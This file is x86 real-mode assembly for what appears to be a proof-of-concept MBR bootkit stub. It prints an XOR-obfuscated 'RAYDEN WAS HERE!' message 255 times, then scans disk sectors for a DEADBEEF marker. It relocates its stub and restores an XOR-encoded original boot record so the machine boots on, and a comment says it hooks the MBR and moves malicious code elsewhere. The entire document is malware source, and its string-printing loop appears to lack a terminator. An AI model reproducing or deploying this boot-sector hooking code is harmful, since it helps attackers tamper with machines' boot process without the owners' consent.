; CONSTANTS
custom_magic 		equ 0xEFBEADDE		; 0xDEADBEEF on disk
custom_magic_addr	equ 0x7FFC
custom_payload_len	equ 0x1B8			; tells us how much of the MBR to copy back

org		0x7C00 	; expected base
bits	16		; 16-bit mode

_start:
	jmp main
	nop

main:
	cli
	; Register setup
	xor	ax, ax
	xor	bl, bl
	mov	ds, ax
	mov	es, ax
	mov	fs, ax
	mov	gs, ax
	mov	ah, 0x0E		; Output mode
	
.setup:
	sub	bl, 1		; Print our message 255 times
	or	bl, bl
	jz	await_key
	mov	si, msg_success
.print:
	lodsb			; al = [ds:si] & si; si++
	xor	al, 0x69
	jz	.setup
	int	0x10
	jmp	.print

await_key:
	xor ah, ah
	int 0x16		; wait for keystroke

.egghunter:			; search for custom magic
	mov	si, disk_address_packet
	mov	ah, 0x42
	int	0x13
	mov	ax, [logical_block_addr]
	inc	ax
	mov	[logical_block_addr], ax
	mov	eax, [custom_magic_addr]
	mov	ebx, custom_magic
	cmp	eax, ebx
	jne	.egghunter

	mov	si, payload 	; hook mbr and move malicious code elsewhere
	mov	bx, 0x8000
.memset:
	lodsb
	mov	[bx], al
	inc bx
	cmp	si, payload_end
	jl	.memset

	jmp 0x8000

payload:				; base 0x8000
	mov	si, 0x7E00
.memset:
	lodsb
	xor	al, 0x5A
	mov	[si-0x201], al
	cmp	si, 0x7E00 + custom_payload_len
	jl 	.memset
	sti
	jmp	0000:0x7C00		; exit to hooked mbr
payload_end:
	
msg_success:	; 'RAYDEN WAS HERE!' xor 0x69
	db		59, 40, 48, 45, 44, 39, 73, 62, 40, 58, 73, 33, 44, 59, 44, 72	
	align	4

disk_address_packet: 
	db	0x10
	db	0
n_blocks:
	dw	1		; use int 0x13 to write
buf_loc:		; 0000:7e00
	dw	0x7e00		
logical_block_addr:	
	dd	1		; lba reads here
	dd	0		
